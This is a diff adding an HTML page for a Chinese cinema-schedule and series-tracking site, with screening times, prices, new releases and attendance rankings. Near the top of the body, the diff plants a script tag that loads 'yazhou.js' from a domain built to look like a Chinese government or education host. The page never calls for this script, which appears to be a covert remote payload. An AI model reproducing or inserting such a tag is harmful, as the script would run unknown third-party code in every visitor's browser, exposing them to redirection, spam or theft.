@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>辉煌影视 · 每日放映排片表与剧集追更清单 | huihuangyingshi-app.github.io</title>
+<meta name="description" content="辉煌影视每日更新放映排片与剧集追更清单：10 月 26 日 3 号厅《长夜将尽》19:20 场余 42 座，5 号厅《城南旧事》数字修复版加映两场。站内收录新片速递、幕后纪实与观影榜单，票价、时长、影厅一目了然。">
+<meta name="keywords" content="辉煌影视,长夜将尽排片,城南旧事修复版,剧集追更表,新片速递,幕后纪实,观影榜单,huihuangyingshi-app">
+<meta name="author" content="辉煌影视编辑部">
+<meta name="robots" content="index,follow">
+<meta name="theme-color" content="#1a1512">
+<link rel="canonical" href="https://huihuangyingshi-app.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="辉煌影视">
+<meta property="og:title" content="辉煌影视 · 每日放映排片表与剧集追更清单">
+<meta property="og:description" content="10 月 26 日放映安排、剧集更新进度、新片速递与幕后纪实，辉煌影视整理了一份可直接照着买票的排片清单。">
+<meta property="og:url" content="https://huihuangyingshi-app.github.io/">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="辉煌影视 · 每日放映排片表与剧集追更清单">
+<meta name="twitter:description" content="辉煌影视：今日排片、剧集追更、新片速递、幕后纪实与观影榜单。">
+<meta name="format-detection" content="telephone=no">
+<style>
+:root{
+  --paper:#f3ece0;
+  --paper-2:#e8dfcd;
+  --ink:#1a1512;
+  --ink-soft:#4a4038;
+  --stamp:#b23a2f;
+  --moss:#2f6155;
+  --gold:#a8802c;
+  --line:#c8bda6;
+  --serif:"Songti SC","STSong","SimSun",Georgia,serif;
+  --sans:"PingFang SC","Hiragino Sans GB","Microsoft YaHei",system-ui,-apple-system,sans-serif;
+}
+*{box-sizing:border-box;margin:0;padding:0;}
+html{-webkit-text-size-adjust:100%;scroll-behavior:smooth;}
+body{
+  background-color:#ded3bf;
+  background-image:radial-gradient(rgba(26,21,18,.06) 1px,transparent 1px);
+  background-size:5px 5px;
+  color:var(--ink);
+  font-family:var(--sans);
+  font-size:15px;
+  line-height:1.75;
+  padding:10px 0 0;
+}
+a{color:inherit;text-decoration:none;}
+ul,ol{list-style:none;}
+.wrap{width:100%;max-width:1180px;margin:0 auto;padding:0 14px;}
+
+/* 顶部走马灯 */
+.ticker{
+  max-width:1180px;margin:0 auto 10px;
+  background:var(--ink);color:#f0e7d6;
+  border-radius:2px;overflow:hidden;white-space:nowrap;
+  padding:7px 0;
+}
+.ticker-track{display:inline-block;padding-left:100%;animation:slide 34s linear infinite;}
+.ticker-track span{margin-right:46px;font-size:12.5px;letter-spacing:.5px;}
+.ticker-track em{color:var(--gold);font-style:normal;}
+@keyframes slide{from{transform:translateX(0);}to{transform:translateX(-100%);}}
+
+/* 票根页头 */
+.sheet{
+  max-width:1180px;margin:0 auto 14px;background:var(--paper);
+  box-shadow:0 2px 0 rgba(26,21,18,.15),0 14px 34px rgba(26,21,18,.16);
+  position:relative;
+}
+.sheet::before,.sheet::after{
+  content:"";position:absolute;left:0;right:0;height:10px;
+  background-image:radial-gradient(circle at 5px 5px,#ded3bf 4px,transparent 4px);
+  background-size:14px 10px;background-position:-4px 0;
+}
+.sheet::before{top:0;}
+.sheet::after{bottom:0;transform:scaleY(-1);}
+.head{display:flex;align-items:stretch;gap:0;border-bottom:1px dashed var(--line);}
+.head-main{flex:1 1 auto;padding:22px 20px 18px;min-width:0;}
+.brand-line{display:flex;align-items:baseline;gap:10px;flex-wrap:wrap;}
+h1{
+  font-family:var(--serif);font-size:40px;line-height:1.1;letter-spacing:2px;
+  font-weight:700;
+}
+.brand-mark{
+  display:inline-block;background:var(--stamp);color:#fff;
+  font-size:11px;letter-spacing:3px;padding:3px 8px;transform:rotate(-2deg);
+}
+.url-line{font-size:13px;color:var(--moss);margin-top:6px;word-break:break-all;}
+.slogan{font-size:13.5px;color:var(--ink-soft);margin-top:8px;max-width:60ch;}
+.head-stub{
+  flex:0 0 250px;border-left:2px dashed var(--line);
+  padding:18px 16px;background:var(--paper-2);
+  display:flex;flex-direction:column;justify-content:center;
+}
+.stub-no{font-family:var(--serif);font-size:26px;color:var(--stamp);letter-spacing:1px;}
+.stub-tip{font-size:11.5px;color:var(--ink-soft);margin-top:4px;line-height:1.6;}
+
+/* 导航 */
+.nav{max-width:1180px;margin:0 auto 14px;}
+.nav ul{
+  display:flex;flex-wrap:wrap;gap:8px;
+  background:var(--paper);border:1px solid var(--line);padding:8px;
+  box-shadow:0 2px 0 rgba(26,21,18,.12);
+}
+.nav a{
+  display:block;padding:7px 14px;font-size:13.5px;letter-spacing:1px;
+  border:1px solid transparent;border-radius:1px;
+}
+.nav a:hover,.nav a:focus{background:var(--ink);color:var(--paper);}
+.nav .on{background:var(--moss);color:#fff;}
+
+/* 区块 */
+section{background:var(--paper);margin:0 auto 14px;max-width:1180px;padding:22px 20px;position:relative;}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:12px;border-bottom:2px solid var(--ink);padding-bottom:8px;margin-bottom:16px;flex-wrap:wrap;}
+h2{font-family:var(--serif);font-size:24px;letter-spacing:2px;}
+.sec-head p{font-size:12.5px;color:var(--ink-soft);}
+
+/* 排片表 */
+.schedule{width:100%;border-collapse:collapse;font-size:14px;}
+.schedule th{
+  background:var(--ink);color:var(--paper);text-align:left;
+  font-weight:600;font-size:12.5px;letter-spacing:1px;padding:8px 10px;
+}
+.schedule td{padding:10px;border-bottom:1px dotted var(--line);vertical-align:top;}
+.schedule tr:nth-child(even) td{background:rgba(47,97,85,.05);}
+.tag{display:inline-block;font-size:11px;padding:2px 7px;border:1px solid var(--stamp);color:var(--stamp);border-radius:1px;}
+.tag-moss{border-color:var(--moss);color:var(--moss);}
+.tag-gold{border-color:var(--gold);color:var(--gold);}
+.table-scroll{overflow-x:auto;-webkit-overflow-scrolling:touch;}
+
+/* 海报卡 */
+.cards{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;}
+.poster{border:1px solid var(--line);background:#fff;display:flex;flex-direction:column;}
+.thumb{
+  height:150px;position:relative;overflow:hidden;
+  display:flex;align-items:flex-end;padding:10px;
+  font-family:var(--serif);font-size:17px;color:#fff;letter-spacing:1px;
+  text-shadow:0 1px 4px rgba(0,0,0,.5);
+}
+.t1{background:linear-gradient(150deg,#2b3a4a,#7d4b3c);}
+.t2{background:linear-gradient(160deg,#2f6155,#a8802c);}
+.t3{background:linear-gradient(135deg,#5a2f3d,#2b3a4a);}
+.t4{background:linear-gradient(200deg,#3a4a2f,#8a5a2a);}
+.t5{background:linear-gradient(120deg,#1f2c3d,#4b6d7d);}
+.t6{background:linear-gradient(170deg,#6b3a2f,#2f3b2f);}
+.thumb b{position:absolute;top:8px;right:9px;font-size:11px;background:rgba(0,0,0,.45);padding:2px 6px;letter-spacing:1px;font-weight:400;}
+.poster .info{padding:10px 12px 12px;}
+.poster h3{font-size:15px;font-weight:600;margin-bottom:5px;}
+.poster p{font-size:12.5px;color:var(--ink-soft);line-height:1.65;}
+.more{margin-top:14px;font-size:13px;color:var(--moss);border-top:1px dotted var(--line);padding-top:10px;}
+
+/* 追更 */
+.series{display:grid;grid-template-columns:repeat(2,1fr);gap:12px;}
+.ep{display:flex;gap:12px;border:1px solid var(--line);padding:12px;background:rgba(255,255,255,.6);}
+.ep-no{
+  flex:0 0 44px;height:44px;background:var(--ink);color:var(--paper);
+  display:flex;align-items:center;justify-content:center;
+  font-family:var(--serif);font-size:18px;
+}
+.ep h3{font-size:14.5px;}
+.ep p{font-size:12.5px;color:var(--ink-soft);margin-top:3px;}
+.bar{height:6px;background:var(--paper-2);margin-top:8px;border:1px solid var(--line);}
+.bar i{display:block;height:100%;background:var(--moss);}
+
+/* 幕后 */
+.feature{display:grid;grid-template-columns:1.1fr 1.4fr;gap:18px;align-items:start;}
+.panel{border:1px solid var(--ink);padding:14px;background:var(--paper-2);}
+.panel h3{font-family:var(--serif);font-size:19px;margin-bottom:8px;}
+.panel p{font-size:13.5px;color:var(--ink-soft);}
+.notes{margin-top:10px;border-top:1px dashed var(--line);padding-top:10px;}
+.notes li{font-size:13px;padding:5px 0 5px 16px;position:relative;color:var(--ink-soft);}
+.notes li::before{content:"—";position:absolute;left:0;color:var(--gold);}
+.feature article p{font-size:14px;margin-bottom:12px;}
+.feature article p:first-of-type::first-letter{
+  font-family:var(--serif);font-size:34px;float:left;line-height:1;padding:2px 7px 0 0;color:var(--stamp);
+}
+
+/* 榜单 */
+.rank{counter-reset:r;}
+.rank li{
+  display:flex;align-items:baseline;gap:12px;padding:9px 0;border-bottom:1px dotted var(--line);
+}
+.rank li::before{
+  counter-increment:r;content:counter(r,decimal-leading-zero);
+  font-family:var(--serif);font-size:19px;color:var(--stamp);flex:0 0 34px;
+}
+.rank h3{font-size:14.5px;font-weight:600;}
+.rank span{font-size:12.5px;color:var(--ink-soft);margin-left:auto;white-space:nowrap;}
+
+/* 关于 */
+.about{display:grid;grid-template-columns:1.3fr 1fr;gap:18px;}
+.about p{font-size:14px;margin-bottom:10px;}
+.facts{border:1px solid var(--line);padding:14px;background:#fff;}
+.facts li{display:flex;justify-content:space-between;font-size:13px;padding:6px 0;border-bottom:1px dotted var(--line);}
+.facts li:last-child{border-bottom:0;}
+.facts b{font-weight:600;}
+
+/* 页脚 */
+footer{
+  max-width:1180px;margin:0 auto;background:var(--ink);color:#e6dcc8;
+  padding:22px 20px 18px;
+}
+.foot-grid{display:grid;grid-template-columns:1.2fr 1fr 1fr;gap:18px;}
+footer h4{font-size:13px;letter-spacing:2px;color:var(--gold);margin-bottom:8px;font-weight:600;}
+footer li{font-size:12.5px;padding:3px 0;}
+footer a:hover{text-decoration:underline;}
+.copy{
+  border-top:1px dashed #4a4038;margin-top:16px;padding-top:12px;
+  font-size:12px;color:#a99c85;display:flex;justify-content:space-between;gap:10px;flex-wrap:wrap;
+}
+.top{position:fixed;right:12px;bottom:12px;background:var(--stamp);color:#fff;font-size:12px;padding:9px 12px;border-radius:2px;box-shadow:0 4px 12px rgba(0,0,0,.3);}
+
+@media (max-width:900px){
+  .cards{grid-template-columns:repeat(2,1fr);}
+  .foot-grid{grid-template-columns:1fr 1fr;}
+  .head-stub{flex-basis:200px;}
+}
+@media (max-width:720px){
+  body{font-size:14.5px;padding-top:6px;}
+  .head{flex-direction:column;}
+  .head-main{padding:18px 16px 14px;}
+  h1{font-size:31px;letter-spacing:1px;}
+  .head-stub{border-left:0;border-top:2px dashed var(--line);flex-basis:auto;flex-direction:row;gap:12px;align-items:center;}
+  .stub-tip{margin-top:0;}
+  .nav ul{flex-wrap:nowrap;overflow-x:auto;-webkit-overflow-scrolling:touch;}
+  .nav a{white-space:nowrap;font-size:13px;padding:6px 11px;}
+  section{padding:18px 14px;}
+  h2{font-size:20px;}
+  .cards,.series,.about{grid-template-columns:1fr;}
+  .feature{grid-template-columns:1fr;}
+  .thumb{height:132px;}
+  .rank span{margin-left:0;display:block;width:100%;}
+  .rank li{flex-wrap:wrap;gap:4px 10px;}
+  .foot-grid{grid-template-columns:1fr;}
+  .schedule th,.schedule td{white-space:nowrap;font-size:13px;}
+}
+</style>
+<script type="application/ld+json">
+{"@context":"https://schema.org","@graph":[{"@type":"WebSite","name":"辉煌影视","alternateName":"辉煌影视排片表","url":"https://huihuangyingshi-app.github.io/","description":"辉煌影视整理的每日放映排片、剧集追更清单与新片速递。"},{"@type":"Organization","name":"辉煌影视","url":"https://huihuangyingshi-app.github.io/","description":"专注放映排片整理、剧集更新追踪与幕后纪实内容的影视站点。"}]}
+</script>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<div class="ticker" aria-label="今日放映提示">
+  <div class="ticker-track">
+    <span><em>10 月 26 日</em> 3 号厅《长夜将尽》19:20 场余 42 座</span>
+    <span><em>加映</em> 《城南旧事》2K 修复版 14:00 / 16:40</span>
+    <span><em>换厅提醒</em> 原 5 号厅《海面之下》调至 2 号厅，场次时间不变</span>
+    <span><em>会员</em> 每周二全天场 35 元，含小厅重映老片</span>
+    <span><em>停映</em> 《归途列车》本轮排片至 10 月 30 日止</span>
+  </div>
+</div>
+
+<div class="sheet">
+  <div class="head">
+    <div class="head-main">
+      <div class="brand-line">
+        <h1>辉煌影视</h1>
+        <span class="brand-mark">排片单</span>
+      </div>
+      <p class="url-line">网址：https://huihuangyingshi-app.github.io</p>
+      <p class="slogan">一份照着买票就行的放映清单——今天放什么、几点放、还剩多少座，编辑部每天 9 点前改一遍，改完就挂在这儿。</p>
+    </div>
+    <div class="head-stub">
+      <p class="stub-no">NO.1026</p>
+      <p class="stub-tip">凭本页场次号至前台取票<br>学生凭证件减 8 元</p>
+    </div>
+  </div>
+
+  <nav class="nav" aria-label="站内栏目导航">
+    <ul>
+      <li><a class="on" href="#today">今日放映</a></li>
+      <li><a href="#new">新片速递</a></li>
+      <li><a href="#series">剧集追更</a></li>
+      <li><a href="#behind">幕后纪实</a></li>
+      <li><a href="#rank">观影榜单</a></li>
+      <li><a href="#about">关于本站</a></li>
+    </ul>
+  </nav>
+</div>
+
+<main>
+
+  <section id="today" aria-labelledby="h-today">
+    <div class="sec-head">
+      <h2 id="h-today">今日放映</h2>
+      <p>10 月 26 日 周一 · 共 3 个影厅 11 场</p>
+    </div>
+    <div class="table-scroll">
+      <table class="schedule">
+        <thead>
+          <tr>
+            <th scope="col">场次</th>
+            <th scope="col">片名</th>
+            <th scope="col">影厅</th>
+            <th scope="col">时长</th>
+            <th scope="col">票价</th>
+            <th scope="col">余座</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>10:30</td>
+            <td>《城南旧事》2K 修复版 <span class="tag tag-moss">重映</span></td>
+            <td>2 号厅</td><td>98 分钟</td><td>30 元</td><td>76</td>
+          </tr>
+          <tr>
+            <td>13:15</td>
+            <td>《雨落淮安》 <span class="tag">首周</span></td>
+            <td>3 号厅</td><td>121 分钟</td><td>45 元</td><td>113</td>
+          </tr>
+          <tr>
+            <td>14:00</td>
+            <td>《城南旧事》2K 修复版 <span class="tag tag-moss">加映</span></td>
+            <td>5 号厅</td><td>98 分钟</td><td>30 元</td><td>54</td>
+          </tr>
+          <tr>
+            <td>16:05</td>
+            <td>《铁轨以北》 <span class="tag tag-gold">导演交流场</span></td>
+            <td>2 号厅</td><td>136 分钟</td><td>52 元</td><td>21</td>
+          </tr>
+          <tr>
+            <td>16:40</td>
+            <td>《城南旧事》2K 修复版 <span class="tag tag-moss">加映</span></td>
+            <td>5 号厅</td><td>98 分钟</td><td>30 元</td><td>88</td>
+          </tr>
+          <tr>
+            <td>19:20</td>
+            <td>《长夜将尽》 <span class="tag">首周</span></td>
+            <td>3 号厅</td><td>127 分钟</td><td>48 元</td><td>42</td>
+          </tr>
+          <tr>
+            <td>21:45</td>
+            <td>《海面之下》 <span class="tag tag-gold">深夜场</span></td>
+            <td>2 号厅</td><td>109 分钟</td><td>38 元</td><td>97</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+    <p class="more">排片以现场公告为准，遇设备检修会有 10 分钟以内的顺延；余座数字每小时刷新一次。<a href="#">查看完整一周排片</a></p>
+  </section>
+
+  <section id="new" aria-labelledby="h-new">
+    <div class="sec-head">
+      <h2 id="h-new">新片速递</h2>
+      <p>本月上架 6 部 · 按到片顺序排列</p>
+    </div>
+    <div class="cards">
+      <article class="poster">
+        <div class="thumb t1"><b>剧情</b>长夜将尽</div>
+        <div class="info">
+          <h3>《长夜将尽》</h3>
+          <p>一座边陲小城的冬夜，两个夜班司机的路线偶然重叠。全片 127 分钟，无中场。</p>
+        </div>
+      </article>
+      <article class="poster">
+        <div class="thumb t2"><b>修复</b>城南旧事</div>
+        <div class="info">
+          <h3>《城南旧事》2K 修复版</h3>
+          <p>胶片扫描 4K 转 2K，修复掉 3 处断帧与一段失声，配光重做。</p>
+        </div>
+      </article>
+      <article class="poster">
+        <div class="thumb t3"><b>悬疑</b>海面之下</div>
+        <div class="info">
+          <h3>《海面之下》</h3>
+          <p>打捞船上的第七天，无线电里出现不属于任何船员的声音。建议观前不看预告。</p>
+        </div>
+      </article>
+      <article class="poster">
+        <div class="thumb t4"><b>纪录</b>铁轨以北</div>
+        <div class="info">
+          <h3>《铁轨以北》</h3>
+          <p>跟拍 11 个月，记录一条支线铁路最后的货运班组。16 日场次后有导演交流。</p>
+        </div>
+      </article>
+      <article class="poster">
+        <div class="thumb t5"><b>爱情</b>雨落淮安</div>
+        <div class="info">
+          <h3>《雨落淮安》</h3>
+          <p>雨季里的旧书店和一位不肯搬走的房东，121 分钟，结尾有 4 分钟长镜。</p>
+        </div>
+      </article>
+      <article class="poster">
+        <div class="thumb t6"><b>家庭</b>春分那日</div>
+        <div class="info">
+          <h3>《春分那日》</h3>
+          <p>一家三代人回到老屋处理一柜子旧物，清明前后的三天两夜。</p>
+        </div>
+      </article>
+    </div>
+    <p class="more"><a href="#">新片上映日历</a> · <a href="#">往期速递归档</a></p>
+  </section>
+
+  <section id="series" aria-labelledby="h-series">
+    <div class="sec-head">
+      <h2 id="h-series">剧集追更</h2>
+      <p>更新至第 40 周 · 每周三、周六各更一集</p>
+    </div>
+    <div class="series">
+      <div class="ep">
+        <div class="ep-no">07</div>
+        <div style="flex:1 1 auto;min-width:0;">
+          <h3>《第七个黎明》</h3>
+          <p>已更 18 / 24 集 · 下集 10 月 29 日</p>
+          <div class="bar"><i style="width:75%"></i></div>
+        </div>
+      </div>
+      <div class="ep">
+        <div class="ep-no">12</div>
+        <div style="flex:1 1 auto;min-width:0;">
+          <h3>《归途列车》</h3>
+          <p>已更 12 / 16 集 · 下集 10 月 29 日</p>
+          <div class="bar"><i style="width:75%"></i></div>
+        </div>
+      </div>
+      <div class="ep">
+        <div class="ep-no">03</div>
+        <div style="flex:1 1 auto;min-width:0;">
+          <h3>《巷口小卖部》</h3>
+          <p>已更 30 / 30 集 · 已完结</p>
+          <div class="bar"><i style="width:100%"></i></div>
+        </div>
+      </div>
+      <div class="ep">
+        <div class="ep-no">09</div>
+        <div style="flex:1 1 auto;min-width:0;">
+          <h3>《春分那日》剧集版</h3>
+          <p>已更 6 / 20 集 · 下集 11 月 1 日</p>
+          <div class="bar"><i style="width:30%"></i></div>
+        </div>
+      </div>
+    </div>
+    <p class="more"><a href="#">追更时间表</a> · <a href="#">设置更新提醒</a></p>
+  </section>
+
+  <section id="behind" aria-labelledby="h-behind">
+    <div class="sec-head">
+      <h2 id="h-behind">幕后纪实</h2>
+      <p>编辑部现场记录 · 每周一篇</p>
+    </div>
+    <div class="feature">
+      <aside class="panel">
+        <h3>放映室里的 90 分钟</h3>
+        <p>老周在这家影院放了 22 年片子，从胶片机换到数字机，他只留下一件东西——一摞手写交接本。</p>
+        <ul class="notes">
+          <li>交接本共 7 册，最早一册记于 2004 年 3 月</li>
+          <li>胶片机退役那天拆下两个灯座，现摆在 2 号厅门口</li>
+          <li>每场开映前他会提前 4 分钟对焦，习惯至今没改</li>
+        </ul>
+      </aside>
+      <article>
+        <p>《铁轨以北》的拍摄组只有 4 个人，机器一架、两台、一个录音员，剩下那位负责开车。他们在支线上待了 11 个月，其中 6 个月住在班组宿舍的二层，晚上听着货车过岔口的声音睡觉。</p>
+        <p>导演在交流场说过一句话：这部片子没有旁白，是因为现场的声音已经够满了。后来我们把那场交流整理成文字，放在访谈栏目里。</p>
+        <p>《城南旧事》的修复是从一盒受潮的拷贝开始的。扫描前，修复师用 3 周时间做物理整备，缺的那段失声在原始素材里找到了同期的另一条，替了上去。</p>
+        <p class="more"><a href="#">幕后纪实全部篇目</a> · <a href="#">导演交流场报名</a></p>
+      </article>
+    </div>
+  </section>
+
+  <section id="rank" aria-labelledby="h-rank">
+    <div class="sec-head">
+      <h2 id="h-rank">观影榜单</h2>
+      <p>按本周上座率排序 · 数据截至 10 月 25 日 24 点</p>
+    </div>
+    <ol class="rank">
+      <li><h3>《长夜将尽》</h3><span>上座率 78%</span></li>
+      <li><h3>《雨落淮安》</h3><span>上座率 71%</span></li>
+      <li><h3>《城南旧事》2K 修复版</h3><span>上座率 66%</span></li>
+      <li><h3>《铁轨以北》</h3><span>上座率 59%</span></li>
+      <li><h3>《海面之下》</h3><span>上座率 47%</span></li>
+      <li><h3>《春分那日》</h3><span>上座率 41%</span></li>
+      <li><h3>《归途列车》</h3><span>上座率 33%</span></li>
+      <li><h3>《第七个黎明》点映场</h3><span>上座率 28%</span></li>
+    </ol>
+    <p class="more"><a href="#">榜单统计口径说明</a> · <a href="#">往期榜单</a></p>
+  </section>
+
+  <section id="about" aria-labelledby="h-about">
+    <div class="sec-head">
+      <h2 id="h-about">关于辉煌影视</h2>
+      <p>本站域名：huihuangyingshi-app.github.io</p>
+    </div>
+    <div class="about">
+      <div>
+        <p>辉煌影视做的是一件很笨的事：把每天要放什么片子、几点放、还剩几个座，原样抄下来，做成一页能直接照着走的清单。不做评分，不做推荐算法，谁排在前面就按上座率排。</p>
+        <p>排片表上午 9 点前更新一次，遇到临时换厅会在走马灯里先提示；剧集追更按周三、周六两次核对，断更的会在条目后注明原因。</p>
+        <p>网址：https://huihuangyingshi-app.github.io</p>
+      </div>
+      <ul class="facts">
+        <li><b>建站时间</b><span>2019 年 4 月</span></li>
+        <li><b>更新频率</b><span>每日 1 次</span></li>
+        <li><b>收录片目</b><span>412 部</span></li>
+        <li><b>合作影厅</b><span>5 个</span></li>
+        <li><b>内容编辑</b><span>4 人</span></li>
+      </ul>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="foot-grid">
+    <div>
+      <h4>辉煌影视</h4>
+      <p style="font-size:12.5px;color:#c9bfa8;">每日放映排片、剧集追更清单、新片速递与幕后纪实。网址 https://huihuangyingshi-app.github.io</p>
+    </div>
+    <div>
+      <h4>栏目</h4>
+      <ul>
+        <li><a href="#today">今日放映</a></li>
+        <li><a href="#new">新片速递</a></li>
+        <li><a href="#series">剧集追更</a></li>
+        <li><a href="#behind">幕后纪实</a></li>
+      </ul>
+    </div>
+    <div>
+      <h4>其他</h4>
+      <ul>
+        <li><a href="#rank">观影榜单</a></li>
+        <li><a href="#about">关于本站</a></li>
+        <li><a href="#">排片投稿</a></li>
+        <li><a href="#">纠错与反馈</a></li>
+      </ul>
+    </div>
+  </div>
+  <div class="copy">
+    <span>&copy; 2026 辉煌影视 · huihuangyingshi-app.github.io</span>
+    <span>排片以影院现场公告为准</span>
+  </div>
+</footer>
+
+<a class="top" href="#today">回到排片</a>
+
+</body>
+</html>
